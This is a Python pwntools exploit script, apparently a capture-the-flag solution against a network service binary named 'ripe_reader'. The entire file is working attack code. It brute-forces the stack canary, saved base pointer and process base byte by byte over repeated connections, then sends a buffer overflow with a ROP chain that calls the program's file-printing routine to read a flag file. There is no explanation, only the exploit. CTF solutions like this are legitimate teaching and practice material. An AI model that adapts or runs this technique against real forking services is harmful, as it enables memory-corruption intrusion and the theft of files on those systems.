#!/usr/bin/python3

from pwn import *
import sys

binary = ELF('ripe_reader')

context.log_level = 'WARN'
server = sys.argv[1]
port = int(sys.argv[2])
buf  = b'./flag.txt\x00'
buf += (0x48 - 0x10 - len(buf)) * b'A'
#x = [i for i in range(256) if i != 10 ]
x = [i for i in range(256) ]
canary = p8(0)

for i in range(7):
	for j in x:
		p = remote(server,port)
		p.recvuntil('[q] QUIT')
		payload = buf + canary + p8(j)
		p.send(payload)
		try:
			p.recvuntil('[q] QUIT')
			canary += p8(j)
			print(hex(u64(canary + (8 - len(canary)) * b'\x00')))
			p.close()
			break
		except:
			continue
	else:
		print("FAILED, you prob got a LF (0xa) in canary")
		sys.exit(1)
		
canary = u64(canary)
print('canary',hex(canary))

rbp = b''

for i in range(6):
	for j in x:
		p = remote(server,port)
		p.recvuntil('[q] QUIT')
		payload = buf + p64(canary) + rbp + p8(j)
		p.send(payload)
		try:
			_ = p.recvuntil('[q] QUIT',timeout=0.5)
			if not b'[q] QUIT' in _:
				continue
			rbp += p8(j)
			print(hex(u64(rbp + (8 - len(rbp)) * b'\x00')))
			p.close()
			break
		except:
			continue
	else:
		print("FAILED, you prob got a LF (0xa) in rbp, or timeout too low")
		sys.exit(1)

rbp = u64(rbp + b'\x00\x00')
print('rbp',hex(rbp))

selectimg = binary.symbols['selectImg'] & 0xfff

for i in range(16):
	p = remote(server,port)
	p.recvuntil('[q] QUIT')
	payload = buf + p64(canary) + p64(rbp) + p16(selectimg + i * 0x1000)
	print(hex(selectimg + i * 0x1000))
	p.send(payload)
	try:
		p.recvuntil('[q] QUIT')
		p.close()
		break
	except:
		continue
else:
	print("FAILED, no base for you")
	sys.exit(1)

procbase = selectimg + i * 0x1000
print('procbase | 0xffff',hex(procbase))
procbase = p16(procbase)

for i in range(4):
	for j in x:
		p = remote(server,port)
		p.recvuntil('[q] QUIT')
		payload = buf + p64(canary) + p64(rbp) + procbase + p8(j)
		p.send(payload)
		try:
			p.recvuntil('[q] QUIT')
			procbase += p8(j)
			print(hex(u64(procbase + (8 - len(procbase)) * b'\x00')))
			p.close()
			break
		except:
			continue
	else:
		print("FAILED, you prob got an LF (0xa) in stack")
		sys.exit(1)

procbase = u64(procbase + b'\x00\x00') - binary.symbols['selectImg']
print('procbase',hex(procbase))
binary.address = procbase

context.update(arch='amd64')
rop = ROP([binary])
try:
	pop_rsi_r15 = rop.find_gadget(['pop rsi','pop r15','ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

offset = 68
if rbp & 0xf == 0:
	offset = 176
print('buf',hex(rbp - offset))

context.log_level = 'INFO'

p = remote(server,port)
p.recvuntil('[q] QUIT')

payload  = buf + p64(canary) + p64(rbp)
payload += p64(pop_rsi_r15)
payload += p64(rbp - offset)
payload += p64(0x0)
payload += p64(binary.symbols['printFile'])

p.send(payload)
p.stream()
